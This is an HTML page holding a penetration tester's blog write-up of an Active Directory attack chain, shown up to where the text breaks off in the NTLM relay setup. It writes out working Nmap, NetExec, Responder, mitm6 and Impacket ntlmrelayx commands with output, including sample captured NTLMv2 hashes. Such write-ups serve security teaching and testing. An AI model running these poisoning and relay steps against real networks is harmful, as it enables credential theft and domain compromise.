<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->From Zero Creds to Enterprise Admin</title><meta name="description" content="Active Directory remains the backbone of most corporate network environments. Despite being a mature technology with decades of security research behind it, ..."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/from-zero-creds-to-ea"/><meta property="og:title" content="From Zero Creds to Enterprise Admin"/><meta property="og:description" content="Active Directory remains the backbone of most corporate network environments. Despite being a mature technology with decades of security research behind it, ..."/><meta property="og:image" content="https://xbz0n.sh/images/ad-attack-chain.jpg"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="From Zero Creds to Enterprise Admin"/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/from-zero-creds-to-ea"/><meta property="twitter:title" content="From Zero Creds to Enterprise Admin"/><meta property="twitter:description" content="Active Directory remains the backbone of most corporate network environments. Despite being a mature technology with decades of security research behind it, ..."/><meta property="twitter:image" content="https://xbz0n.sh/images/ad-attack-chain.jpg"/><meta property="image" content="https://xbz0n.sh/images/ad-attack-chain.jpg"/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/from-zero-creds-to-ea"/><meta name="next-head-count" content="24"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/be284b2f70ed0068.css" as="style"/><link rel="stylesheet" href="/_next/static/css/be284b2f70ed0068.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-ee7e63bc15b31913.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-0a3c670da7f1f1eb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6f140346224d0b31.js" defer=""></script><script src="/_next/static/chunks/676-8a913a0c6948fe82.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-80e53230ab478c73.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_buildManifest.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a><a href="https://app.hackthebox.com/public/users/8208" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="HackTheBox"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">← Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">From Zero Creds to Enterprise Admin</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2025-05-20">May 20, 2025</time></div></div><div class="blog-content">
<p><img src="/images/ad-attack-chain.jpg" alt="Active Directory Attack Chain"></p>
<h2>Introduction</h2>
<p>Active Directory remains the backbone of most corporate network environments. Despite being a mature technology with decades of security research behind it, misconfigurations and default settings continue to provide avenues for attackers to gain complete control of Windows domains.</p>
<p>This article details how I was able to go from having zero credentials to obtaining Enterprise Admin access during a recent engagement. The attack chain demonstrates how several seemingly minor misconfigurations can be chained together to compromise an entire Active Directory forest.</p>
<p>What makes this attack particularly effective is that it requires no exploitation of unpatched vulnerabilities - just the abuse of insecure configurations that exist in many corporate environments by default.</p>
<h2>Initial Reconnaissance</h2>
<p>The first phase of any internal network test involves thorough enumeration to identify potential targets and vulnerabilities. Using standard tools like Nmap, Nessus Professional, and custom scripts, I performed an intensive network scan covering all 65,535 TCP ports and key UDP ports to discover the attack surface.</p>
<pre class="language-bash"><code class="language-bash">sudo nmap -sS -sV -p- --min-rate 10000 -oA full_scan 192.168.0.0/24
sudo nmap -sU -sV --top-ports 200 -oA udp_scan 192.168.0.0/24
</code></pre>
<p>The scans revealed a substantial Windows environment with numerous servers and workstations, providing plenty of targets for further investigation.</p>
<h2>Identifying Key Misconfigurations</h2>
<h3>SMB Signing Not Required</h3>
<p>One of the first things I look for in Windows environments is whether SMB signing is enforced. SMB signing provides integrity protection for SMB traffic, preventing man-in-the-middle attacks. When it's not required, attackers can intercept and relay authentication attempts to gain unauthorized access.</p>
<p>I used NetExec (formerly CrackMapExec) to identify hosts with SMB signing not required:</p>
<pre class="language-bash"><code class="language-bash">nxc smb 192.168.0.0/24 --gen-relay-list smb_targets.txt
</code></pre>
<p>The results were promising - virtually all machines in the domain had SMB signing disabled:</p>
<pre class="language-none"><code class="language-none">SMB         192.168.0.11       445    DC-SERVER01      [*] Windows Server 2022 Build 20348 x64 (name:DC-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)
SMB         192.168.0.10       445    APP-SERVER01     [*] Windows Server 2022 Build 20348 x64 (name:APP-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)
SMB         192.168.0.28       445    SQL-SERVER01     [*] Windows 10 / Server 2016 Build 14393 x64 (name:SQL-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)
</code></pre>
<h2>Setting Up for MITM Attacks</h2>
<p>Given the SMB signing issues, the next logical step was to attempt network poisoning to intercept authentication traffic. This approach leverages how Windows systems attempt to resolve hostnames and authenticate to network resources.</p>
<h3>LLMNR/NBT-NS Poisoning with Responder</h3>
<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are name resolution protocols used by Windows when DNS fails. These protocols are vulnerable to poisoning attacks where an attacker can respond to broadcast queries and capture authentication hashes.</p>
<p>I started Responder to listen for and respond to these broadcasts:</p>
<pre class="language-bash"><code class="language-bash">sudo responder -I eth0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &#x26; MDNS Responder 3.1.5.0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [OFF]
    SQL server                 [OFF]
    FTP server                 [OFF]
    IMAP server                [OFF]
    POP3 server                [OFF]
    SMTP server                [OFF]
    DNS server                 [OFF]
    LDAP server                [OFF]
    MQTT server                [OFF]
    RDP server                 [OFF]
    DCE-RPC server             [OFF]
    WinRM server               [OFF]
    SNMP server                [OFF]
</code></pre>
<h3>IPv6 DNS Poisoning with MITM6</h3>
<p>To increase my chances of intercepting authentication, I also deployed MITM6. This tool exploits the fact that Windows prioritizes IPv6 over IPv4 by default, but many corporate networks haven't properly secured their IPv6 implementation.</p>
<p>MITM6 spoofs IPv6 router advertisements and DNS responses, forcing Windows clients to use the attacker as their DNS server:</p>
<pre class="language-bash"><code class="language-bash">sudo mitm6 -d corp.local

Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:9a:b1:c2]
IPv4 address: 192.168.0.3
IPv6 address: fe80::20c:29ff:fe9a:b1c2
DNS local search domain: corp.local
DNS allowlist: corp.local
Sent spoofed reply for FILE-SERVER01.corp.local. to fe80::1eb8:804e:abdc:2526
IPv6 address fe80::3908:1 is now assigned to mac=fc:3f:db:53:fd:1d
Sent spoofed reply for DC-APPSERVER.corp.local. to fe80::a1c2:7cd2:e569:b991
Sent spoofed reply for wpad.corp.local. to fe80::a1c2:7cd2:e569:b991
</code></pre>
<h2>Credential Capture</h2>
<p>After running Responder and MITM6 for just a short time, I captured several NTLMv2 hashes from domain users and service accounts:</p>
<pre class="language-none"><code class="language-none">[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.107
[*] [NTLM] NTLMv2-SSP Username : CORP\FILE-SERVER01$
[*] [NTLM] NTLMv2-SSP Hash     : FILE-SERVER01$::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...

[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.64
[*] [NTLM] NTLMv2-SSP Username : CORP\jifko.admin
[*] [NTLM] NTLMv2-SSP Hash     : jifko.admin::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...

[*] [NTLM] NTLMv2-SSP Client   : 192.168.0.28
[*] [NTLM] NTLMv2-SSP Username : CORP\sqlservice
[*] [NTLM] NTLMv2-SSP Hash     : sqlservice::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0A1B2C3D4E5F6:0101000000000000...
</code></pre>
<h2>Understanding NTLM Relay Attacks</h2>
<p>NTLM is Microsoft's legacy authentication protocol used throughout Active Directory. In a standard NTLM exchange, a client sends an authentication request, the server responds with a challenge, and the client returns a response based on its password hash. The server verifies this response to authenticate the user.</p>
<p>During a relay attack, I position myself in the middle of this exchange. When a client tries to authenticate to me (thinking I'm a legitimate server), I immediately forward those authentication messages to a target of my choosing. The target server sends back a challenge, which I relay to the client. The client responds with valid credentials, which I pass along to the target - effectively impersonating that user without ever knowing their password.</p>
<p>The beauty of this attack is that I never need to crack a single password hash. I'm simply relaying the legitimate authentication messages in real time. This is exactly why SMB signing is critical - it cryptographically links the authentication messages together to prevent this kind of manipulation.</p>
<h2>Impacket: The Red Team's Network Protocol Toolkit</h2>
<p>For the relay attacks, I turned to Impacket - the go-to Python framework for low-level protocol manipulation. Impacket lets you craft, dissect, and manipulate network packets across virtually all Windows protocols including SMB, MSRPC, NTLM, and Kerberos.</p>
<p>Unlike high-level libraries that abstract away the protocol details, Impacket gives you direct access to the raw protocol interactions, making it perfect for offensive security testing. My attack chain relied primarily on two Impacket tools: ntlmrelayx for relaying NTLM authentication and secretsdump for extracting credentials via DCSync.</p>
<p>Other Impacket gems include psexec, wmiexec, and smbexec for remote command execution, GetUserSPNs for Kerberoasting, and GetNPUsers for AS-REP roasting. The framework handles all the low-level details of Windows authentication, letting you focus on the attack strategy rather than protocol implementation.</p>
<h2>NTLM Relay Attack</h2>
<p>Having identified machines with SMB signing disabled and captured authentication attempts, I was ready to set up an NTLM relay attack. Rather than trying to crack the hashes (which could be time-consuming or impossible for complex passwords), I decided to relay them to target services.</p>
<h3>Setting up NTLM Relay to LDAP</h3>
<p>I configured Impacket's ntlmrelayx tool to relay authentication attempts to the domain controller's LDAP service. By using the <code>--delegate-access</code> option, I would be able to create computer accounts with special delegation rights:</p>
<pre class="language-bash"><code class="language-bash">sudo impacket-ntlmrelayx \
  -t ldap://dc-server01.corp.local:389 \
  --delegate-access \
  --no-smb-server

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
